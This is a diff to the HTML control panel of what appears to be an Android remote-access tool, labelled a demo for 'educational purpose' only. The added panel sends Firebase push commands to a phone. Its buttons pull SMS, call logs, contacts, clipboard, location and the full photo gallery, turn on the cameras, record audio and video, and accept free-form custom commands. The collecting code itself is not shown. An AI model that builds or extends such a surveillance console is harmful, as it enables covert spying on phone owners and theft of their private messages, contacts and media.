@@ -9,7 +9,7 @@
 <body>
     <header>
         <h1>Android Device Demo Server</h1>
-        <p>Web GUI v5.3 — Monitor, Control & Browse</p>
+        <p>Web GUI v6.0 — Monitor, Control & Browse</p>
     </header>
 
     <div class="tabs">
@@ -37,8 +37,43 @@
                     <h2>Server Logs</h2>
                     <div id="logs-container"><div id="logs"><p>Waiting for logs...</p></div></div>
                 </div>
+                <div class="fcm-panel">
+                    <div class="fcm-header">
+                        <h2>📤 FCM Push Commands</h2>
+                        <span id="fcm-status-badge" class="fcm-badge fcm-badge-unknown">Checking...</span>
+                    </div>
+                    <p class="fcm-hint">Send commands via Firebase Cloud Messaging (push). Works even if socket is idle.</p>
+                    <div class="button-group">
+                        <button id="fcm-device-info" class="btn fcm-btn">Device Info</button>
+                        <button id="fcm-location" class="btn fcm-btn">Location</button>
+                        <button id="fcm-storage" class="btn fcm-btn">Storage</button>
+                        <button id="fcm-app-list" class="btn fcm-btn">App List</button>
+                        <button id="fcm-gallery" class="btn fcm-btn">Gallery List</button>
+                        <button id="fcm-sms" class="btn fcm-btn">SMS Logs</button>
+                        <button id="fcm-call-logs" class="btn fcm-btn">Call Logs</button>
+                        <button id="fcm-contacts" class="btn fcm-btn">Contacts</button>
+                        <button id="fcm-notifications" class="btn fcm-btn">Notifications</button>
+                        <button id="fcm-camera-front" class="btn fcm-btn">Front Camera</button>
+                        <button id="fcm-camera-back" class="btn fcm-btn">Back Camera</button>
+                        <button id="fcm-record-audio" class="btn fcm-btn">Record Audio</button>
+                        <button id="fcm-record-video" class="btn fcm-btn">Record Video</button>
+                        <button id="fcm-screenshot" class="btn fcm-btn">Screenshot</button>
+                        <button id="fcm-battery" class="btn fcm-btn">Battery</button>
+                        <button id="fcm-clipboard" class="btn fcm-btn">Clipboard</button>
+                        <button id="fcm-download-gallery" class="btn fcm-btn">Download All Gallery</button>
+                    </div>
+                    <div class="custom-command fcm-custom">
+                        <h3>Custom FCM Command</h3>
+                        <div class="cmd-row">
+                            <input type="text" id="fcm-cmd-input" placeholder="Command (e.g., list_files)">
+                            <input type="text" id="fcm-args-input" placeholder='JSON args (e.g., {"path": "/sdcard"})'>
+                            <button id="btn-fcm-send-custom" class="btn btn-primary">Send via FCM</button>
+                        </div>
+                    </div>
+                    <div id="fcm-result" class="fcm-result"></div>
+                </div>
                 <div class="controls-panel">
-                    <h2>Device Controls</h2>
+                    <h2>Device Controls (Socket)</h2>
                     <div class="button-group">
                         <button id="btn-device-info" class="btn">Device Info</button>
                         <button id="btn-location" class="btn">Location</button>
@@ -137,7 +172,7 @@
     </div>
 
     <footer>
-        <p>Android Device Demo Server v5.3 | Educational Purpose Only</p>
+        <p>Android Device Demo Server v6.0 | Educational Purpose Only</p>
     </footer>
     <script src="script.js"></script>
 </body>
